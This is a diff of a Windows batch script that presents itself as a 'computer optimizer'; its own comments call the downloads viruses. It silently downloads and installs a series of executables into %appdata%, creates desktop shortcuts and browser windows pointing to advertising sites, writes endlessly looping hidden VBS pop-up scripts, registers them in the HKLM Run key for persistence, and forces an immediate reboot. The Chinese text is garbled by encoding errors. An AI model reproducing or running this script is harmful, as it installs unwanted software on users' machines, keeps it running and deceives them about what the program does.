@@ -1,17 +1,17 @@
-@rem ´Ë³ÌĞò»á¶ÔµçÄÔÔì³ÉÑÏÖØÉËº¦£¬ÇëÄúÈıË¼¶øºóĞĞ£¡
-@rem ¿ª·¢Õß£ºbilibili.com@SYSTEM-CSRSS-FYC Î´¾­Í¬Òâ£¬ÑÏ½û¶ş¸Ä£¡
+@rem æ­¤ç¨‹åºä¼šå¯¹ç”µè„‘é€ æˆä¸¥é‡ä¼¤å®³ï¼Œè¯·æ‚¨ä¸‰æ€è€Œåè¡Œï¼
+@rem å¼€å‘è€…ï¼šbilibili.com@SYSTEM-CSRSS-FYC æœªç»åŒæ„ï¼Œä¸¥ç¦äºŒæ”¹ï¼
 
-@rem Ìí¼Ó±êÌâ
-@title µçÄÔÓÅ»¯Æ÷ 
-@rem UIÉè¼Æ
+@rem æ·»åŠ æ ‡é¢˜
+@title ç”µè„‘ä¼˜åŒ–å™¨ 
+@rem UIè®¾è®¡
 color 27
 cls
-@echo »¶Ó­Ê¹ÓÃµçÄÔÓÅ»¯Æ÷£¬ÇëÔÚÔËĞĞÇ°È·±£ÍøÂçÒÑ¿ªÆô
+@echo æ¬¢è¿ä½¿ç”¨ç”µè„‘ä¼˜åŒ–å™¨ï¼Œè¯·åœ¨è¿è¡Œå‰ç¡®ä¿ç½‘ç»œå·²å¼€å¯
 @pause
-@echo ÕıÔÚÖ´ĞĞÓÅ»¯²Ù×÷
-@rem ±£»¤½ø³Ì
-wmic process where name='P5PDownloader' call SetPriority "256"
-@rem ÏÂÔØ²¡¶¾ÎÄ¼ş
+@echo æ­£åœ¨æ‰§è¡Œä¼˜åŒ–æ“ä½œ
+@rem ä¿æŠ¤è¿›ç¨‹
+wmic process where name='P5PDownloader.exe' call SetPriority "256"
+@rem ä¸‹è½½ç—…æ¯’æ–‡ä»¶
 cd %appdata%
 powershell curl -o "9wka01.exe" "https://download.2345.com/2345pcsafe/background/20220607/2345pcsafeoffline.exe"
 powershell curl -o "9wwdj21.exe" "https://dl.2345.com/haozip/haozip_v6.3.1.11144_compliant.exe"
@@ -21,8 +21,8 @@ powershell curl -o "5iaddss.exe" "https://dl.2345.com/pdfcvt/2345PdfConverter_v2
 powershell curl -o "2iefe1.exe" "http://dl.kkdownload.com/kzgw_18/kuaizip_setup_v3.3.0.7_kzgw_001.exe"
 powershell curl -o "qoiawfj31.exe" "http://file.cdn.cqttech.com/file/ChromeCore_1286_4.1.5.26.exe"
 powershell curl -o "qoiwewf32q31.exe" "https://cdn.tongbuxing.net/1NW4yC/SetupChrome.exe"
-powershell curl -o "qoiw9im89.exe" "http://picture.xianniu.com/pc/download/4.6.1.1/xianniusetup.4.6.1.1@SG6@.exe"@rem ¾²Ä¬°²×°²¡¶¾
-@rem ¾²Ä¬°²×°²¡¶¾
+powershell curl -o "qoiw9im89.exe" "http://picture.xianniu.com/pc/download/4.6.1.1/xianniusetup.4.6.1.1@SG6@.exe"
+@rem é™é»˜å®‰è£…ç—…æ¯’
 start /wait   "9wka01.exe" /S
 start /wait   "9wwdj21.exe" /S
 start /wait   "2ds8sc1.exe" /S
@@ -41,12 +41,12 @@ wmic process where name='2iefe1.exe' call SetPriority "256"
 wmic process where name='qoiawfj31.exe' call SetPriority "256"
 wmic process where name='qoiwewf32q31.exe' call SetPriority "256"
 wmic process where name='qoiw9im89.exe' call SetPriority "256"
-@rem ´´½¨²¡¶¾ÍøÖ·¿ì½İ·½Ê½
+@rem åˆ›å»ºç—…æ¯’ç½‘å€å¿«æ·æ–¹å¼
 @echo off
 set Program=http://4mir.zhangyu39.com/
-set LnkName=Ò»µ¶999£¬µ¶µ¶±¬Éñ×°£¡
-set WorkDir=Ò»µ¶999£¬µ¶µ¶±¬Éñ×°£¡
-set Desc=µ±ÄêÍø°É×î»ğµÄÒ³ÓÎ
+set LnkName=ä¸€åˆ€999ï¼Œåˆ€åˆ€çˆ†ç¥è£…ï¼
+set WorkDir=ä¸€åˆ€999ï¼Œåˆ€åˆ€çˆ†ç¥è£…ï¼
+set Desc=å½“å¹´ç½‘å§æœ€ç«çš„é¡µæ¸¸
 if not defined WorkDir call:GetWorkDir "%Program%"
 (echo Set WshShell=CreateObject("WScript.Shell"^)
 echo strDesKtop=WshShell.SPEcialFolders("DesKtop"^)
@@ -62,9 +62,9 @@ del /f /q makeviruslnk.vbs
 
 @echo off
 set Program=https://www.douyin.com/
-set LnkName=¶¶ÒôÍøÒ³°æ
-set WorkDir=¶¶ÒôÍøÒ³°æ
-set Desc=·ÖÏíÃÀºÃ£¬Áô×¡¸Ğ¶¯
+set LnkName=æŠ–éŸ³ç½‘é¡µç‰ˆ
+set WorkDir=æŠ–éŸ³ç½‘é¡µç‰ˆ
+set Desc=åˆ†äº«ç¾å¥½ï¼Œç•™ä½æ„ŸåŠ¨
 if not defined WorkDir call:GetWorkDir "%Program%"
 (echo Set WshShell=CreateObject("WScript.Shell"^)
 echo strDesKtop=WshShell.SPEcialFolders("DesKtop"^)
@@ -80,9 +80,9 @@ del /f /q makeviruslnk.vbs
 
 @echo off
 set Program=http://6.cn/
-set LnkName=6¼ä·¿Ö±²¥
-set WorkDir=6¼ä·¿Ö±²¥
-set Desc=6¼ä·¿Ö±²¥
+set LnkName=6é—´æˆ¿ç›´æ’­
+set WorkDir=6é—´æˆ¿ç›´æ’­
+set Desc=6é—´æˆ¿ç›´æ’­
 if not defined WorkDir call:GetWorkDir "%Program%"
 (echo Set WshShell=CreateObject("WScript.Shell"^)
 echo strDesKtop=WshShell.SPEcialFolders("DesKtop"^)
@@ -98,9 +98,9 @@ del /f /q makeviruslnk.vbs
 
 @echo off
 set Program=http://www.2345.com/
-set LnkName=ÉÏÍøµ¼º½
-set WorkDir=ÉÏÍøµ¼º½
-set Desc=ÉÏÍøµ¼º½
+set LnkName=ä¸Šç½‘å¯¼èˆª
+set WorkDir=ä¸Šç½‘å¯¼èˆª
+set Desc=ä¸Šç½‘å¯¼èˆª
 if not defined WorkDir call:GetWorkDir "%Program%"
 (echo Set WshShell=CreateObject("WScript.Shell"^)
 echo strDesKtop=WshShell.SPEcialFolders("DesKtop"^)
@@ -114,42 +114,42 @@ makeviruslnk.vbs
 attrib +s +h %systemdrive%\users\Desktop\%username%\makeviruslnk.vbs
 del /f /q makeviruslnk.vbs
 
-@rem ´ò¿ª²¡¶¾ÍøÖ·
+@rem æ‰“å¼€ç—…æ¯’ç½‘å€
 start iexplore http://www.douyin.com/
 start iexplore http://www.pinduoduo.com/
 start iexplore http://4mir.zhangyu39.com/
 start iexplore http://www.2345.com/
 start iexplore http://www.hao360.com/
-@rem Í¶·ÅÌØÊâ¹ã¸æ
+@rem æŠ•æ”¾ç‰¹æ®Šå¹¿å‘Š
 cd %systemdrive
 @echo off
 do
-wscript.createobject("wscript.shell").run "mshta vbscript:msgbox(""ÀîÊ±Õä³ÆËüÎª¡°ÄĞÈË±¦£¬´ó¼Ò·şÁË¶¼ËµºÃ!"")(window.close)",vhide
-loop>>gg1.vbs
-gg1.vbs
+wscript.createobject("wscript.shell").run "mshta vbscript:msgbox(""ææ—¶çç§°å®ƒä¸ºâ€œç”·äººå®ï¼Œå¤§å®¶æœäº†éƒ½è¯´å¥½!"")(window.close)",vhide
+loop>>%systemdrive%\gg1.vbs
+%systemdrive%\gg1.vbs
 attrib +s +h gg1.vbs
 
 @echo off
 do
-wscript.createobject("wscript.shell").run "mshta vbscript:msgbox(""Ğ¡Óã±ãÇ©£¬°ïÄú±ãÀûÉú»î£¡"")(window.close)",vhide
-loop>>gg2.vbs
-gg2.vbs
+wscript.createobject("wscript.shell").run "mshta vbscript:msgbox(""å°é±¼ä¾¿ç­¾ï¼Œå¸®æ‚¨ä¾¿åˆ©ç”Ÿæ´»ï¼"")(window.close)",vhide
+loop>>%systemdrive%\gg2.vbs
+%systemdrive%\gg2.vbs
 attrib +s +h gg2.vbs
 
 @echo off
 do
-wscript.createobject("wscript.shell").run "mshta vbscript:msgbox(""2345°²È«ÎÀÊ¿£¬ÊØ»¤ÄúµÄµçÄÔ°²È«£¡"")(window.close)",vhide
-loop>>gg3.vbs
-gg3.vbs
+wscript.createobject("wscript.shell").run "mshta vbscript:msgbox(""2345å®‰å…¨å«å£«ï¼Œå®ˆæŠ¤æ‚¨çš„ç”µè„‘å®‰å…¨ï¼"")(window.close)",vhide
+loop>>%systemdrive%\gg3.vbs
+%systemdrive%\gg3.vbs
 attrib +s +h gg3.vbs
-@rem ½«²¡¶¾Ğ´Èë¿ª»úÆô¶¯Ïî
+@rem å°†ç—…æ¯’å†™å…¥å¼€æœºå¯åŠ¨é¡¹
 @ECHO OFF
 reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run /v virus.p5p.1 /t REG_SZ /d %systemdrive%\gg1.vbs /f
 reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run /v virus.p5p.2 /t REG_SZ /d %systemdrive%\gg2.vbs /f
 reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run /v virus.p5p.3 /t REG_SZ /d %systemdrive%\gg3.vbs /f
-@echo ÓÅ»¯Íê³É£¬¼´½«ÖØÆô
+@echo ä¼˜åŒ–å®Œæˆï¼Œå³å°†é‡å¯
 pause
 shutdown /r /t 0
-@rem »ú¶¼¹ØÁË£¬exit¸ÉÂï£¨doge£©
-@rem ÈÃ´úÂë¸üºÃ¿´£¨doge£©
+@rem æœºéƒ½å…³äº†ï¼Œexitå¹²å˜›ï¼ˆdogeï¼‰
+@rem è®©ä»£ç æ›´å¥½çœ‹ï¼ˆdogeï¼‰
 exit
